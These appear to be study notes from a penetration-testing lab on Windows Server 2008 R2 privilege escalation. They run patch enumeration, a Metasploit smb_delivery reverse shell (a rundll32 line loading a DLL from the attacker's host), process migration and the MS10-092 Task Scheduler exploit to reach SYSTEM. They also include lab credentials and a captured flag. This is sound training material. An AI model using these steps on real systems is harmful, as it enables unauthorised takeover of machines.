# Legacy Windows Server

Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020

| Feature                                                    | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
|------------------------------------------------------------|----------------|----------------|-------------|-------------|
| Enhanced Windows Defender Advanced Threat Protection (ATP) |                |                |             | X           |
| Just Enough Administration                                 | Partial        | Partial        | X           | X           |
| Credential Guard                                           |                |                | X           | X           |
| Remote Credential Guard                                    |                |                | X           | X           |
| Device Guard (code integrity)                              |                |                | X           | X           |
| AppLocker                                                  | Partial        | X              | X           | X           |
| Windows Defender                                           | Partial        | Partial        | X           | X           |
| Control Flow Guard                                         |                |                | X           | X           |

Enumeration script to look for missing patches : https://github.com/rasta-mouse/Sherlock OR https://github.com/AonCyberLabs/Windows-Exploit-Suggester

## Querying Current Patch Level

```
wmic qfe

Caption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\Administrator  3/31/2021
```

## Running Sherlock

```
Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y

Import-Module .\Sherlock.ps1

Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

```

## Obtaining a Meterpreter Shell

1) Generate a local dll and listening for reverse shell

```
sudo msfconsole -q

exploit(windows/smb/smb_delivery) > search smb_delivery
use exploit/windows/smb/smb_delivery

msf6 exploit(windows/smb/smb_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   DLL
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > set target 0

target => 0

exploit

[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

2) Rundll Command on Target Host

```
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

3) Receiving Reverse Shell

```
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```

## Searching for Local Privilege Escalation Exploit

1) https://www.exploit-db.com/exploits/19930

```
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
use exploit/windows/local/ms10_092_schelevator
```

2) Migrate from 32 to 64-bit Process

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getpid

Current pid: 2268


meterpreter > ps

Process List
============
 PID   PPID  Name               Arch  Session  User                    Path
 ---   ----  ----               ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 164   1800  VMwareUser.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareUser.exe
 244   2032  winlogon.exe
 260   4     smss.exe
 288   476   svchost.exe
 332   324   csrss.exe
 376   324   wininit.exe
 476   376   services.exe
 492   376   lsass.exe
 500   376   lsm.exe
 584   476   mscorsvw.exe
 600   476   svchost.exe
 616   476   msdtc.exe
 676   476   svchost.exe
 744   476   taskhost.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 756   1800  VMwareTray.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareTray.exe
 764   476   svchost.exe
 800   476   svchost.exe
 844   476   svchost.exe
 900   476   svchost.exe
 940   476   svchost.exe
 976   476   spoolsv.exe
 1012  476   sppsvc.exe
 1048  476   svchost.exe
 1112  476   VMwareService.exe
 1260  2460  powershell.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1408  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 1464  900   dwm.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 1632  476   svchost.exe
 1672  600   WmiPrvSE.exe
 2140  2460  cmd.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\cmd.exe
 2256  600   WmiPrvSE.exe
 2264  476   mscorsvw.exe
 2268  2628  rundll32.exe       x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
 2460  2656  explorer.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2632  2032  csrss.exe
 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2876  476   svchost.exe
 3048  476   svchost.exe
 
 
meterpreter > migrate 2796

[*] Migrating from 2268 to 2796...
[*] Migration completed successfully.


meterpreter > background

[*] Backgrounding session 1...
```

3) Setting Privilege Escalation Module Options

```
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3
msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443

 exploit

[*] Started reverse TCP handler on 10.10.14.3:4443
[*] Preparing payload at C:\Windows\TEMP\uQEcovJYYHhC.exe
[*] Creating task: isqR4gw3RlxnplB
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\isqR4gw3RlxnplB...
[*] Original CRC32: 0x89b06d1a
[*] Final CRC32: 0x89b06d1a
[*] Writing our modified content back...
[*] Validating task: isqR4gw3RlxnplB
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] isqR4gw3RlxnplB                          6/1/2021 1:04:00 PM    Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (175174 bytes) to 10.129.43.15
[*] SUCCESS: Attempted to run the scheduled task "isqR4gw3RlxnplB".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" was successfully deleted.
[*] SCHELEVATOR


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-2K8
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```

## LAB

xfreerdp /v:10.129.65.110 /u:htb-student /p:HTB_@cademy_stdnt!

PS C:\Tools> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y

Import-Module .\Sherlock.ps1
Find-AllVulns

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

1) Generate a local dll and listening for reverse shell

```
sudo msfconsole -q

exploit(windows/smb/smb_delivery) > search smb_delivery
use exploit/windows/smb/smb_delivery

msf6 exploit(windows/smb/smb_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   DLL
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > set target 0

target => 0

set LHOST tun0
set SRVHOST tun0

exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.15.97:4444 
[*] Server is running. Listening on 10.10.15.97:445
[*] Server started.
[*] Run the following command on the target machine:
[msf](Jobs:1 Agents:0) exploit(windows/smb/smb_delivery) >> rundll32.exe \\10.10.15.97\ZSEnI\test.dll,0

```

2) Rundll Command on Target Host

```
rundll32.exe \\10.10.15.97\ZSEnI\test.dll,0


```

3) Receiving Reverse Shell

```
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```


1) https://www.exploit-db.com/exploits/19930

```
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
use exploit/windows/local/ms10_092_schelevator
```

2) Migrate from 32 to 64-bit Process

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getpid

Current pid: 1916

meterpreter > ps

 1004  2740  conhost.exe  x64   2        WINLPE-2K8\htb-st  C:\Windows\System3
                                         udent              2\conhost.exe
 1028  456   spoolsv.exe
 1108  456   svchost.exe
 1184  456   VGAuthServi
             ce.exe
 1216  456   vmtoolsd.ex
             e
 1244  456   ManagementA
             gentHost.ex
             e
 1284  932   dwm.exe      x64   2        WINLPE-2K8\htb-st  C:\Windows\System3
                                         udent              2\dwm.exe
 1344  2848  vmtoolsd.ex  x64   2        WINLPE-2K8\htb-st  C:\Program Files\V
             e                           udent              Mware\VMware Tools
                                                            \vmtoolsd.exe
 1512  620   WmiPrvSE.ex
             e
 1652  456   svchost.exe
 1696  456   svchost.exe
 1752  1652  rdpclip.exe  x64   2        WINLPE-2K8\htb-st  C:\Windows\System3
                                         udent              2\rdpclip.exe
 1824  456   dllhost.exe
 1916  352   rundll32.ex  x86   2        WINLPE-2K8\htb-st  C:\Windows\SysWOW6
             e                           udent              4\rundll32.exe
 1960  456   msdtc.exe
 2076  456   taskhost.ex  x64   2        WINLPE-2K8\htb-st  C:\Windows\System3
             e                           udent              2\taskhost.exe
 2176  620   WmiPrvSE.ex
             e
 2344  2740  conhost.exe  x64   2        WINLPE-2K8\htb-st  C:\Windows\System3
                                         udent              2\conhost.exe

 
meterpreter > migrate 2344

[*] Migrating from 1916 to 2344...
[*] Migration completed successfully.


meterpreter > background

[*] Backgrounding session 1...
```

3) Setting Privilege Escalation Module Options

```
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost tun0
msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443

exploit

C:\Windows\system32>type c:\Users\Administrator\Desktop\flag.txt
type c:\Users\Administrator\Desktop\flag.txt
L3gacy_st1ill_pr3valent!
